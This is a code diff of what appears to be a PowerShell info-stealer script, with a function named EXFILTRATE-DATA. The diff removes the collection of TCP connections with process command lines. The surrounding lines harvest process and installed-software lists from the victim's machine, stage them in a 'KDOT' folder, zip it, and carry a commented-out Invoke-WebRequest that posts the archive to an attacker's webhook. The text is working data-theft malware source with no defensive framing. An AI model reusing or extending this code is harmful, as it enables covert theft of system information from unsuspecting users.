@@ -42,9 +42,6 @@ function EXFILTRATE-DATA {
     # Running Applications
     Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
     
-    # TCP Connections
-    Get-NetTCPConnection | select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | sort Remoteaddress -Descending | ft -wrap -autosize > $env:temp\tcp-connections.txt
-    
     # Installed Applicatons
     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
     
@@ -171,7 +168,6 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
-    Move-Item -Path "$extracted\tcp-connections.txt" -Destination "$extracted\KDOT\tcp-connections.txt" -ErrorAction SilentlyContinue
 
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$extracted\KDOT.zip" -ContentType "multipart/form-data"
